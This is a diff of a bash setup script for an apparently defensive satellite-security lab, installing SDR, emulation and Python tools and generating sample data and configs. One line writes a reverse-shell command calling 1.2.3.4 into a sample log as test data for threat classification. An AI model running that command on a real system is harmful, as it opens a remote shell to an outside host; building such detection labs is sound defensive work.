@@ -1,49 +1,60 @@
 #!/bin/bash
-
-# Full Lab Setup Script for Satellite Defense Toolkit
-# Prepares host for testing dashboard, OTA, firmware, AI, GNSS, etc.
+#  Lab Setup Script for Satellite Defense Toolkit
 
 set -euo pipefail
+echo -e "\n[+] Starting Satellite Defense Toolkit Lab Setup..."
 
-echo "[+] Updating system packages..."
+# --- SYSTEM PREP ---
+echo "[+] Updating and installing base packages..."
 sudo apt update && sudo apt install -y \
     git python3 python3-pip python3-venv \
-    docker.io qemu-system-arm \
-    rtl-sdr build-essential \
-    iptables net-tools curl unzip
+    docker.io qemu-system-arm qemu-efi qemu-utils \
+    rtl-sdr hackrf soapysdr-tools \
+    net-tools iptables curl unzip build-essential \
+    libusb-1.0-0-dev libfftw3-dev
 
-echo "[+] Creating virtual environment..."
+# --- DOCKER ---
+echo "[+] Ensuring Docker is active..."
+sudo systemctl enable docker
+sudo systemctl start docker
+
+# --- PYTHON ENV ---
+echo "[+] Creating Python virtual environment..."
 python3 -m venv .venv
 source .venv/bin/activate
 
-echo "[+] Upgrading pip and installing Python libraries..."
+echo "[+] Installing Python dependencies..."
 pip install --upgrade pip
 pip install \
     flask flask-socketio websocket-client websockets \
     transformers torch torchaudio openai \
     psutil rich pyyaml opencv-python Pillow numpy \
-    vosk pyttsx3 stix2 taxii2-client yara-python
+    vosk pyttsx3 stix2 taxii2-client yara-python \
+    geopy scapy matplotlib plotly pyshark
 
-echo "[+] Creating directory structure..."
-mkdir -p logs/dashboard
-mkdir -p logs/ota_streams
-mkdir -p results
-mkdir -p sandbox
-mkdir -p pcaps
-mkdir -p observables
-mkdir -p threat_feeds
-mkdir -p webgui
+# --- FOLDER STRUCTURE ---
+echo "[+] Creating lab directory structure..."
+mkdir -p \
+  logs/dashboard \
+  logs/ota_streams \
+  results \
+  sandbox \
+  pcaps \
+  observables \
+  threat_feeds \
+  webgui_web \
+  config \
+  data \
+  firmware \
+  webgui_web/assets
 
-echo "[+] Creating sample memory file..."
+# --- SAMPLE FILES ---
+echo "[+] Creating memory and OTA samples..."
 dd if=/dev/urandom of=/tmp/mem.bin bs=1M count=1
-
-echo "[+] Creating simulated OTA binary stream..."
 dd if=/dev/urandom of=logs/ota_streams/ota_stream.bin bs=4K count=10
 
-echo "[+] Creating example log for threat classification..."
+echo "[+] Creating sample log and MITRE map..."
 echo "Suspicious shell execution: bash -i >& /dev/tcp/1.2.3.4/443 0>&1" > logs/sample.log
-
-echo "[+] Generating sample MITRE technique mapping..."
 cat <<EOF > results/mitre_map.json
 {
   "Execution": {
@@ -54,8 +65,36 @@ cat <<EOF > results/mitre_map.json
   }
 }
 EOF
-
-echo "[+] Generating placeholder observed tactics..."
 echo '["command-line interface", "startup folder"]' > observables/observed_tactics.json
 
-echo "[✓] Lab setup complete. You may now launch modules or start the dashboard."
+# --- CONFIG FILES ---
+echo "[+] Generating default Copilot config..."
+cat <<EOF > config/copilot_config.json
+{
+  "ai_model": "gpt-4",
+  "voice_alerts": false,
+  "max_tokens": 2048,
+  "temperature": 0.3
+}
+EOF
+
+echo "[+] Creating dashboard default agent entry..."
+cat <<EOF > webgui/agents.json
+[
+  {
+    "id": "satlab001",
+    "type": "ground_station",
+    "location": "Lab",
+    "status": "active"
+  }
+]
+EOF
+
+# --- TOOL CHECK ---
+echo "[+] Verifying key tools..."
+which rtl_power || echo "WARNING: rtl_power not found"
+which qemu-system-arm || echo "WARNING: qemu-system-arm not found"
+
+# --- README LOG ---
+echo "[✓] Satellite Defense Toolkit Lab setup completed successfully."
+echo "[✓] You may now run: source .venv/bin/activate && python3 webgui_web/app.py"
